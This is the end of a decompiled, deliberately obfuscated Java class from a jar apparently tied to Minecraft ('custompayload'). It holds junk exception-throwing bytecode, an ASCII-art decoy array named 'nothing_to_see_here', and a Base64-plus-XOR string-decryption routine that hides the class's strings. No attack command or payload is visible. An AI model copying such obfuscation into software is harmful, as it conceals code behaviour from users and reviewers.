    //   6966: invokespecial <init> : (Ljava/lang/String;)V
    //   6969: aload_3
    //   6970: athrow
    //   6971: new java/lang/IllegalAccessException
    //   6974: astore_3
    //   6975: aload_3
    //   6976: invokespecial <init> : ()V
    //   6979: aload_3
    //   6980: athrow
    //   6981: nop
    //   6982: nop
    //   6983: nop
    //   6984: athrow
    //   6985: nop
    //   6986: nop
    //   6987: nop
    //   6988: nop
    //   6989: nop
    //   6990: athrow
    //   6991: nop
    //   6992: nop
    //   6993: nop
    //   6994: athrow
    //   6995: nop
    //   6996: nop
    //   6997: nop
    //   6998: nop
    //   6999: nop
    //   7000: athrow
    //   7001: nop
    //   7002: nop
    //   7003: nop
    //   7004: athrow
    //   7005: nop
    //   7006: nop
    //   7007: nop
    //   7008: nop
    //   7009: nop
    //   7010: athrow
    //   7011: new java/lang/IllegalAccessException
    //   7014: astore_3
    //   7015: aload_3
    //   7016: invokespecial <init> : ()V
    //   7019: aload_3
    //   7020: athrow
    //   7021: new java/lang/IllegalAccessException
    //   7024: astore_3
    //   7025: aload_3
    //   7026: invokespecial <init> : ()V
    //   7029: aload_3
    //   7030: athrow
    //   7031: new java/lang/RuntimeException
    //   7034: astore_3
    //   7035: aload_3
    //   7036: invokespecial <init> : ()V
    //   7039: aload_3
    //   7040: athrow
    //   7041: nop
    //   7042: nop
    //   7043: nop
    //   7044: athrow
    //   7045: nop
    //   7046: nop
    //   7047: nop
    //   7048: nop
    //   7049: nop
    //   7050: athrow
    //   7051: nop
    //   7052: nop
    //   7053: nop
    //   7054: athrow
    //   7055: nop
    //   7056: nop
    //   7057: nop
    //   7058: nop
    //   7059: nop
    //   7060: athrow
    //   7061: new java/io/IOException
    //   7064: astore_3
    //   7065: aload_3
    //   7066: invokespecial <init> : ()V
    //   7069: aload_3
    //   7070: athrow
    //   7071: new java/lang/IllegalAccessException
    //   7074: astore_3
    //   7075: aload_3
    //   7076: invokespecial <init> : ()V
    //   7079: aload_3
    //   7080: athrow
    //   7081: nop
    //   7082: nop
    //   7083: nop
    //   7084: athrow
    //   7085: nop
    //   7086: nop
    //   7087: nop
    //   7088: nop
    //   7089: nop
    //   7090: athrow
    //   7091: nop
    //   7092: nop
    //   7093: nop
    //   7094: athrow
    //   7095: nop
    //   7096: nop
    //   7097: nop
    //   7098: nop
    //   7099: nop
    //   7100: athrow
    //   7101: new java/lang/RuntimeException
    //   7104: astore_3
    //   7105: aload_3
    //   7106: ldc 'Error in hash'
    //   7108: invokespecial <init> : (Ljava/lang/String;)V
    //   7111: aload_3
    //   7112: athrow
    //   7113: new java/lang/RuntimeException
    //   7116: astore_3
    //   7117: aload_3
    //   7118: invokespecial <init> : ()V
    //   7121: aload_3
    //   7122: athrow
    //   7123: new java/lang/IllegalAccessException
    //   7126: astore_3
    //   7127: aload_3
    //   7128: invokespecial <init> : ()V
    //   7131: aload_3
    //   7132: athrow
    //   7133: nop
    //   7134: nop
    //   7135: nop
    //   7136: athrow
    //   7137: nop
    //   7138: nop
    //   7139: nop
    //   7140: nop
    //   7141: nop
    //   7142: athrow
    //   7143: new java/lang/RuntimeException
    //   7146: astore_3
    //   7147: aload_3
    //   7148: ldc 'Error in hash'
    //   7150: invokespecial <init> : (Ljava/lang/String;)V
    //   7153: aload_3
    //   7154: athrow
    //   7155: new java/io/IOException
    //   7158: astore_3
    //   7159: aload_3
    //   7160: invokespecial <init> : ()V
    //   7163: aload_3
    //   7164: athrow
    //   7165: new java/lang/RuntimeException
    //   7168: astore_3
    //   7169: aload_3
    //   7170: invokespecial <init> : ()V
    //   7173: aload_3
    //   7174: athrow
    //   7175: nop
    //   7176: nop
    //   7177: nop
    //   7178: athrow
    //   7179: nop
    //   7180: nop
    //   7181: nop
    //   7182: nop
    //   7183: nop
    //   7184: athrow
    //   7185: nop
    //   7186: nop
    //   7187: nop
    //   7188: athrow
    //   7189: nop
    //   7190: nop
    //   7191: nop
    //   7192: nop
    //   7193: nop
    //   7194: athrow
    //   7195: new java/lang/IllegalAccessException
    //   7198: astore_3
    //   7199: aload_3
    //   7200: ldc 'Error in hash'
    //   7202: invokespecial <init> : (Ljava/lang/String;)V
    //   7205: aload_3
    //   7206: athrow
    //   7207: new java/lang/IllegalAccessException
    //   7210: astore_3
    //   7211: aload_3
    //   7212: invokespecial <init> : ()V
    //   7215: aload_3
    //   7216: athrow
    //   7217: nop
    //   7218: nop
    //   7219: nop
    //   7220: athrow
    //   7221: nop
    //   7222: nop
    //   7223: nop
    //   7224: nop
    //   7225: nop
    //   7226: athrow
    //   7227: new java/lang/IllegalAccessException
    //   7230: astore_3
    //   7231: aload_3
    //   7232: invokespecial <init> : ()V
    //   7235: aload_3
    //   7236: athrow
    //   7237: new java/lang/IllegalAccessException
    //   7240: astore_3
    //   7241: aload_3
    //   7242: ldc 'Error in hash'
    //   7244: invokespecial <init> : (Ljava/lang/String;)V
    //   7247: aload_3
    //   7248: athrow
    //   7249: nop
    //   7250: nop
    //   7251: nop
    //   7252: athrow
    //   7253: nop
    //   7254: nop
    //   7255: nop
    //   7256: nop
    //   7257: nop
    //   7258: athrow
    //   7259: nop
    //   7260: nop
    //   7261: nop
    //   7262: athrow
    //   7263: nop
    //   7264: nop
    //   7265: nop
    //   7266: nop
    //   7267: nop
    //   7268: athrow
    //   7269: ldc_w 2053153034
    //   7272: iload #168
    //   7274: ixor
    //   7275: istore #168
    //   7277: aload_1
    //   7278: areturn
    //   7279: nop
    //   7280: nop
    //   7281: nop
    //   7282: nop
    //   7283: nop
    //   7284: nop
    //   7285: nop
    //   7286: nop
    //   7287: nop
    //   7288: nop
    //   7289: nop
    //   7290: nop
    //   7291: nop
    //   7292: nop
    //   7293: nop
    //   7294: nop
    //   7295: nop
    //   7296: nop
    //   7297: nop
    //   7298: nop
    //   7299: nop
    //   7300: athrow
    //   7301: nop
    //   7302: nop
    //   7303: nop
    //   7304: athrow
    //   7305: nop
    //   7306: nop
    //   7307: nop
    //   7308: nop
    //   7309: nop
    //   7310: athrow
    //   7311: new java/io/IOException
    //   7314: astore_3
    //   7315: aload_3
    //   7316: invokespecial <init> : ()V
    //   7319: aload_3
    //   7320: athrow
    //   7321: new java/lang/RuntimeException
    //   7324: astore_3
    //   7325: aload_3
    //   7326: invokespecial <init> : ()V
    //   7329: aload_3
    //   7330: athrow
    //   7331: nop
    //   7332: nop
    //   7333: nop
    //   7334: athrow
    //   7335: nop
    //   7336: nop
    //   7337: nop
    //   7338: nop
    //   7339: nop
    //   7340: athrow
    //   7341: new java/io/IOException
    //   7344: astore_3
    //   7345: aload_3
    //   7346: invokespecial <init> : ()V
    //   7349: aload_3
    //   7350: athrow
    //   7351: new java/io/IOException
    //   7354: astore_3
    //   7355: aload_3
    //   7356: ldc 'Error in hash'
    //   7358: invokespecial <init> : (Ljava/lang/String;)V
    //   7361: aload_3
    //   7362: athrow
    // Exception table:
    //   from	to	target	type
    //   58	98	170	java/lang/RuntimeException
    //   120	128	170	java/lang/RuntimeException
    //   681	721	783	java/lang/RuntimeException
    //   743	751	783	java/lang/RuntimeException
    //   939	979	1031	java/lang/RuntimeException
    //   1001	1009	1031	java/lang/RuntimeException
    //   1247	1287	1339	java/io/IOException
    //   1309	1317	1339	java/io/IOException
    //   1467	1507	1559	java/lang/RuntimeException
    //   1529	1537	1559	java/lang/RuntimeException
    //   1687	1727	1779	java/lang/IllegalAccessException
    //   1749	1757	1779	java/lang/IllegalAccessException
    //   1870	3283	6615	java/lang/Exception
    //   3283	3323	3375	java/lang/RuntimeException
    //   3345	3353	3375	java/lang/RuntimeException
    //   3469	3509	3561	java/lang/RuntimeException
    //   3531	3539	3561	java/lang/RuntimeException
    //   3657	3697	3749	java/io/IOException
    //   3719	3727	3749	java/io/IOException
    //   3845	3885	3937	java/lang/RuntimeException
    //   3907	3915	3937	java/lang/RuntimeException
    //   4044	4084	4136	java/io/IOException
    //   4106	4114	4136	java/io/IOException
    //   4255	4295	4347	java/lang/RuntimeException
    //   4317	4325	4347	java/lang/RuntimeException
    //   4441	4481	4533	java/lang/IllegalAccessException
    //   4503	4511	4533	java/lang/IllegalAccessException
    //   4629	4669	4721	java/lang/RuntimeException
    //   4691	4699	4721	java/lang/RuntimeException
    //   4817	4857	4909	java/lang/IllegalAccessException
    //   4879	4887	4909	java/lang/IllegalAccessException
    //   5054	5094	5146	java/lang/RuntimeException
    //   5116	5124	5146	java/lang/RuntimeException
    //   5279	5319	5371	java/io/IOException
    //   5341	5349	5371	java/io/IOException
    //   5503	5543	5595	java/lang/IllegalAccessException
    //   5565	5573	5595	java/lang/IllegalAccessException
    //   5689	5729	5781	java/io/IOException
    //   5751	5759	5781	java/io/IOException
    //   5904	5944	5996	java/lang/IllegalAccessException
    //   5966	5974	5996	java/lang/IllegalAccessException
  }
  
  static {
    nothing_to_see_here[0] = "⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄";
    nothing_to_see_here[1] = "⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄";
    nothing_to_see_here[2] = "⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄";
    nothing_to_see_here[3] = "⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄";
    nothing_to_see_here[4] = "⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰";
    nothing_to_see_here[5] = "⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤";
    nothing_to_see_here[6] = "⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗";
    nothing_to_see_here[7] = "⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄";
    nothing_to_see_here[8] = "⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄";
    nothing_to_see_here[9] = "⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄";
    nothing_to_see_here[10] = "⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄";
    nothing_to_see_here[11] = "⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄";
    nothing_to_see_here[12] = "⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄";
    nothing_to_see_here[13] = "⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴";
    nothing_to_see_here[14] = "⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿";
    int i = 0x15807949 ^ 0x3B12729B ^ Integer.parseInt("2124480140");
    EswkRKw3U1 = 0x2DA1DA14 ^ i;
  }
  
  private static String thisIsAInsaneEncryptionMethod(String input, int key) {
    Base64.Decoder decoder = Base64.getDecoder();
    byte[] arrayOfByte4 = input.getBytes();
    byte[] arrayOfByte1 = decoder.decode(arrayOfByte4);
    String str = Integer.toString(key);
    byte[] arrayOfByte2 = str.getBytes();
    byte b2 = 24;
    byte[] arrayOfByte3 = new byte[b2];
    boolean bool1 = false;
    byte b1 = 11;
    arrayOfByte3[bool1] = b1;
    boolean bool2 = true;
    byte b25 = 79;
    arrayOfByte3[bool2] = b25;
    byte b3 = 2;
    byte b26 = 39;
    arrayOfByte3[b3] = b26;
    byte b4 = 3;
    byte b27 = 127;
    arrayOfByte3[b4] = b27;
    byte b5 = 4;
    byte b28 = 91;
    arrayOfByte3[b5] = b28;
    byte b6 = 5;
    byte b29 = 118;
    arrayOfByte3[b6] = b29;
    byte b7 = 6;
    byte b30 = 44;
    arrayOfByte3[b7] = b30;
    byte b8 = 7;
    byte b31 = 19;
    arrayOfByte3[b8] = b31;
    byte b9 = 8;
    byte b32 = 18;
    arrayOfByte3[b9] = b32;
    byte b10 = 9;
    byte b33 = 56;
    arrayOfByte3[b10] = b33;
    byte b11 = 10;
    byte b34 = 92;
    arrayOfByte3[b11] = b34;
    byte b12 = 11;
    byte b35 = 28;
    arrayOfByte3[b12] = b35;
    byte b13 = 12;
    byte b36 = 13;
    arrayOfByte3[b13] = b36;
    byte b14 = 13;
    byte b37 = 94;
    arrayOfByte3[b14] = b37;
    byte b15 = 14;
    byte b38 = 40;
    arrayOfByte3[b15] = b38;
    byte b16 = 15;
    byte b39 = 14;
    arrayOfByte3[b16] = b39;
    byte b17 = 16;
    byte b40 = 16;
    arrayOfByte3[b17] = b40;
    byte b18 = 17;
    byte b41 = 52;
    arrayOfByte3[b18] = b41;
    byte b19 = 18;
    byte b42 = 49;
    arrayOfByte3[b19] = b42;
    byte b20 = 19;
    byte b43 = 36;
    arrayOfByte3[b20] = b43;
    byte b21 = 20;
    byte b44 = 66;
    arrayOfByte3[b21] = b44;
    byte b22 = 21;
    byte b45 = 8;
    arrayOfByte3[b22] = b45;
    byte b23 = 22;
    byte b46 = 39;
    arrayOfByte3[b23] = b46;
    byte b24 = 23;
    byte b47 = 13;
    arrayOfByte3[b24] = b47;
    int j = 0;
    while (true) {
      int k = arrayOfByte1.length;
      if (j < k) {
        byte b48 = arrayOfByte1[j];
        int i3 = arrayOfByte2.length;
        int i1 = j % i3;
        byte b52 = arrayOfByte2[i1];
        int m = b48 ^ b52;
        byte b49 = (byte)m;
        arrayOfByte1[j] = b49;
        byte b50 = arrayOfByte1[j];
        int i4 = arrayOfByte3.length;
        int i2 = j % i4;
        byte b53 = arrayOfByte3[i2];
        int n = b50 ^ b53;
        byte b51 = (byte)n;
        arrayOfByte1[j] = b51;
        j++;
        continue;
      } 
      String str1 = new String();
      this(arrayOfByte1);
      return str1;
    } 
  }
}


/* Location:              D:\cs2\minecr\AOTF-release.v.1.jar!\me\custompayload\normal\NormalMode.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */